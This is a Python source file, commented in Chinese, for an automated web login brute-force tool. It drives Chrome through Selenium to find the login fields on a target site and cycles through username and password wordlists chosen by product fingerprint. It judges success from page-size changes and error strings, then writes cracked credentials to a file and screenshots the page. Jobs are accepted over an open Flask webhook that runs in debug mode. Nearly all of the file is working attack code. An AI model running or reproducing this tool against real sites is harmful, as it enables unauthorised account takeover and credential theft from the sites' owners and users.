#coding:utf-8
#Author:sunshine
#Data:20210119

from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import os
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import *
from flask import Flask, request
from multiprocessing import Pool


old_size = 0
app = Flask(__name__)
list_num = []#这个list只是个计数器，我没用声明全局变量的方法，太麻烦了
err_notin = ['无法访问此网站','ERR_','密码错误','口令错误']

#input标签查找模块
def check_user_pwd(target,browser,input_user,input_pass):
	browser.get(target)
	wait = WebDriverWait(browser, 3)
	if input_user != None and input_pass != None:
		try:
			wait.until(EC.presence_of_element_located((By.ID, input_user)))
			wait.until(EC.presence_of_element_located((By.ID, input_pass)))
			check = 'input_id'
			return check
		except TimeoutException:
			input_user = None
			input_pass = None
			print('[+] 精准匹配input标签失败，将采用通用规则进行匹配')
	if input_user == None and input_pass == None:
		try:
			#找到所有的input标签，type属性为text的
			len_input = len(wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="text"]'))))

			if len_input > 2:
				check = 'false'
			if len_input == 2:
				try:
					wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="password"]')))#查找所有type是password的元素，返回对象是list
					check = 'false'
				except TimeoutException:#匹配到密码框的type是text的
					check = 'password'
			if len_input == 1:
				check = 'true'

		except TimeoutException:
			check = 'not_find_type=text'

		if check == 'not_find_type=text' :#匹配用户名框没有type属性的情况
			try:
				len_username_input = len(wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@name]'))))
				if len_username_input == 2:
					wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="password"]')))
					check = 'username'#匹配到用户名框没有type参数的
				else:
					check = 'false'
			except TimeoutException:
				check = 'false'
		return check

#截图模块
def screenshot(browser,target,user,pwd):
	with open('success.txt', 'a+', encoding='utf-8') as f:
		f.write('网址：' + target + '用户名:' + user + '密码:' + pwd + '\n')
	print('[+] 爆破成功：'+ '网址：' + target + '用户名:' + user + '密码:' + pwd)
	domain = target.split('/')[2].replace(':','&')
	if os.path.exists(os.path.join(os.getcwd(),'log',domain)) == False:
		os.mkdir(os.path.join(os.getcwd(),'log',domain))
		try:
			browser.maximize_window()  # 最大化浏览器窗口，可以不开启
			browser.save_screenshot(os.path.join(os.getcwd(),'log',domain,domain + ".png"))
			print("[+] 截图成功：" + os.path.join(os.getcwd(),'log',domain,domain + ".png"))
		except BaseException as msg:
			print(msg)

#爆破执行模块
def Login(user,pwd,target,check,browser,input_user,input_pass):
	global old_size
	try:
		if old_size == 0:
			browser.get(target)
			wait = WebDriverWait(browser, 6)
			if check == 'true':
				print('-----------------------------------')
				username = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="text"]')))
				password = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="password"]')))
			if check == 'password':
				print('++++++++++++++++++++++++++++++++++++')
				list_input = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="text"]')))
				username = list_input[0]
				password = list_input[1]
			if check == 'username':
				print('************************************')
				list_username = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@name]')))
				username = list_username[0]
				password = list_username[1]
			if check == 'input_id':
				print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
				username = wait.until(EC.presence_of_element_located((By.ID, input_user)))
				password = wait.until(EC.presence_of_element_located((By.ID, input_pass)))
			username.clear()
			password.clear()
			username.send_keys('test_old_size')
			password.send_keys('test_old_size')
			password.send_keys(Keys.ENTER)
			#判断是否存在弹窗，如果存在弹窗自动确定，避免程序出现异常
			alert_check = EC.alert_is_present()(browser)
			if alert_check:
				alert_check.accept()
			old_size += len(browser.page_source)
			print('[+] old_size是'+str(old_size))
			time.sleep(0.5)

		browser.get(target)
		wait = WebDriverWait(browser, 6)
		if check == 'true':
			print('-----------------------------------')
			username = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="text"]')))
			password = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="password"]')))
		if check == 'password':
			print('++++++++++++++++++++++++++++++++++++')
			list_input = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="text"]')))
			username = list_input[0]
			password = list_input[1]
		if check == 'username':
			print('************************************')
			list_username = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@name]')))
			username = list_username[0]
			password = list_username[1]
		if check == 'input_id':
			print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
			username = wait.until(EC.presence_of_element_located((By.ID, input_user)))
			password = wait.until(EC.presence_of_element_located((By.ID, input_pass)))
		#username.clear()#可能会触发某些未知异常
		#password.clear()
		#记录下两个input标签的坐标位，必须在提交数据或刷新前获取值，否则会异常
		# user_location = username.location
		# pass_location = password.location

		username.send_keys(user)
		password.send_keys(pwd)
		password.send_keys(Keys.ENTER)
		# 判断是否存在弹窗，如果存在弹窗自动确定，避免程序出现异常
		alert_check = EC.alert_is_present()(browser)
		if alert_check:
			alert_check.accept()

		time.sleep(1)  # 每次发包时的间隔，设置太低，资源加载未完成会引起误报，建议设置0.8以上
		new_size = len(browser.page_source)
		print('[+] 本次返回值new_size是'+str(new_size)+' 正在测试'+target)
		print(user)
		print(pwd)
		#没想到特别好的方案，差值定大了漏报，定小了误报……太难了
		if (new_size - old_size >= 3) or (old_size - new_size >= 3):
			for err in err_notin:
				if err in browser.page_source:
					status = False
					break
				else:
					status = True
			if (status == True) and ('div' in browser.page_source):#根据返回html中的字段进行匹配，解决了一部分误报，但需要更多的特征去做匹配
				try:
					print('[+] 上次返回值old_size是'+str(old_size)+'  正在测试'+target)
					print('[+] 检测到本次返回值与上次返回值大小不同')
					if check == 'true':
						print('true')
						time.sleep(3)#测试时发现会出现个别网站没有加载完毕就匹配节点了
						print('-----------------------------------')
						user_xy = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="text"]')))
						pwd_xy = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="password"]')))
					if check == 'password':
						time.sleep(3)
						print('password')
						print('++++++++++++++++++++++++++++++++++++')
						list_input = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@type="text"]')))
						user_xy = list_input[0]
						pwd_xy = list_input[1]
					if check == 'username':
						time.sleep(3)
						print('username')
						print('*************************************')
						list_username = wait.until(EC.presence_of_all_elements_located((By.XPATH, '//input[@name]')))
						user_xy = list_username[0]
						pwd_xy = list_username[1]
					if check == 'input_id':
						time.sleep(3)
						print('input_id')
						user_xy = wait.until(EC.presence_of_element_located((By.ID, input_user)))
						pwd_xy = wait.until(EC.presence_of_element_located((By.ID, input_pass)))
					#这个判断是为了解决登录成功后，恰好后台存在2个input标签被模糊匹配到的情况，使用坐标判断,但这个判断误报率太高了,后面再考虑改进方法
					# if (user_location != user_xy.location) or (pass_location != pwd_xy.location):
					# 	screenshot(browser, target, user, pwd)
					# 	return 'success'
				except TimeoutException:
					screenshot(browser, target, user, pwd)
					return 'success'
				except Exception as e:#出现其他未知异常时抛出异常
					print(e)
		old_size = new_size#把本次的返回值赋值到old_size
	except UnexpectedAlertPresentException:
		print('[+] UnexpectedAlertPresentException异常，驱动设置cookie失败')
	except TimeoutException:
		list_num.append('1')
		print('[+] TimeoutException异常，没有找到元素,第'+str(len(list_num))+'次异常')
		with open('error.txt', 'a+', encoding='utf-8')as f:
			f.write(target + '\n')


def start_chrom():
	print('[+] 正在后台打开谷歌浏览器...')
	chrome_option = Options()
	chrome_option.add_argument('blink-settings=imagesEnabled=false')#关闭图片显示
	chrome_option.add_argument('--ignore-certificate-errors')#关闭错误拦截，您的连接不是私密连接
	# chrome_option.add_argument('--headless')#开启无头浏览器
	#chrome_option.add_argument('--proxy-server=127.0.0.1:10809')#添加代理，只支持http和https
	chrome_option.add_experimental_option('excludeSwitches', ['enable-logging'])  # 关闭控制台日志
	browser = webdriver.Chrome(executable_path="./chromedriver.exe", chrome_options=chrome_option)
	browser.set_page_load_timeout(500)
	print('[+] 正在爆破中，请稍等 ~')
	return browser

def ready_user(fingerprint):
	user_queue = []
	with open(os.path.join(os.getcwd(),'dict_user',fingerprint + '_user.txt'),'r') as fuser:
		for user in fuser.readlines():
			user_queue.append(user.strip())
	if fingerprint != 'default':
		with open(os.path.join(os.getcwd(), 'dict_user', 'default_user.txt'), 'r') as fuser:
			for user in fuser.readlines():
				user_queue.append(user.strip())
	return user_queue

def ready_pass(fingerprint):
	passwd_queue = []
	with open(os.path.join(os.getcwd(),'dict_pass',fingerprint + '_pass.txt'),'r') as fpass:
		for pwd in fpass.readlines():
			passwd_queue.append(pwd.strip())
	if fingerprint != 'default':
		with open(os.path.join(os.getcwd(), 'dict_pass', 'default_pass.txt'), 'r') as fpass:
			for pwd in fpass.readlines():
				passwd_queue.append(pwd.strip())
	return passwd_queue

def start_brute(fingerprint,target,check,browser,mode,input_user,input_pass):
	user_list = ready_user(fingerprint)
	passwd_list = ready_pass(fingerprint)
	if mode == '1':
		while len(user_list) != 0:
			u = user_list.pop(0)
			for p in passwd_list:
				status = Login(u,p,target,check,browser,input_user,input_pass)
				if status == 'success':
					return
				if len(list_num) == 3:
					list_num.clear()
					print('[+] 异常次数超过三次，正在结束本次任务')
					return
	if mode == '2':
		while len(passwd_list) != 0:
			p = passwd_list.pop(0)
			for u in user_list:
				status = Login(u, p, target, check,browser,input_user,input_pass)
				if status == 'success':
					return
				if len(list_num) == 3:
					list_num.clear()
					print('[+] 异常次数超过三次，正在结束本次任务')
					return
	if mode == '3':
		while len(user_list) != 0 and len(passwd_list) != 0:
			u =user_list.pop(0)
			p = passwd_list.pop(0)
			status = Login(u, p, target, check,browser,input_user,input_pass)
			if status == 'success':
				return
			if len(list_num) == 3:
				list_num.clear()
				print('[+] 异常次数超过三次，正在结束本次任务')
				return


#多进程调用chrome进行暴力破解，任务调度模块
def pool_task(target_task,fingerprint_task,mode,input_user,input_pass):
	browser = start_chrom()
	print('[+] 任务启动，当前目标'+target_task)
	print('[+] 任务启动，当前指纹' + fingerprint_task)
	try:
		check = check_user_pwd(target_task,browser,input_user,input_pass)
		if check == 'false':
			print('[+] 已经跳过任务')
			browser.quit()
			return 'false'
		else:
			#在每个进程中old_size必须初始为0，否则会影响其他进程的逻辑判断
			global old_size
			old_size = 0
			print('[+] 初始化old_size为0')
			start_brute(fingerprint_task, target_task, check,browser,mode,input_user,input_pass)
	except Exception as e:
		if 'ERR_CONNECTION_TIMED_OUT' in str(e):
			print('[+] 域名访问失败，已跳过任务')
	except:
		raise
	browser.quit()
	print("[+] 爆破结束，正在关闭浏览器，请稍等")

#flask视图模块
@app.route('/webhook', methods=['GET'])#用于添加任务到txt和list中
def add_task():
	#获取接口请求的3个参数
	target = request.args.get('target')
	fingerprint = request.args.get('fingerprint')
	mode = request.args.get('mode')
	input_user = request.args.get('input_user')
	input_pass = request.args.get('input_pass')
	if (input_user == None and input_pass != None) or (input_user != None and input_pass == None):
		return '[+] input_user参数或input_pass参数存在错误，请检查更正'
	num_list = ['1', '2', '3']
	if mode not in num_list:
		return "[+] 输入错误，只接收1、2、3这三个值，1、单用户内密码循环爆破 2、单密码内多用户循环爆破 3、用户和密码按每行顺序爆破"
	if ('http://' not in target) and ('https://' not in target):
		return '[+] 只支持http或https协议'
	dict_user = os.path.join(os.getcwd(),'dict_user',fingerprint + '_user.txt')
	dict_pass = os.path.join(os.getcwd(),'dict_pass',fingerprint + '_pass.txt')
	if (os.path.exists(dict_user) == False) or (os.path.exists(dict_pass) == False):
		print('[+] 没找到该指纹的字典，将使用默认字典')
		fingerprint = 'default'

	target_queue.append(target)
	fingerprint_queue.append(fingerprint)
	print(target_queue)
	print(fingerprint_queue)
	while len(target_queue) != 0:
		target_task = target_queue.pop(0)
		fingerprint_task = fingerprint_queue.pop(0)
		po.apply_async(pool_task, (target_task,fingerprint_task,mode,input_user,input_pass))
	return '[+] 任务已收到，正在执行暴力破解'

if __name__ == '__main__':
	target_queue = []
	fingerprint_queue = []
	po = Pool(1)#使用进程池，这里是设置最大进程数量，也就是同时开启多少个chrom进行爬取
	app.run(host='0.0.0.0',port= 5000,debug=True)
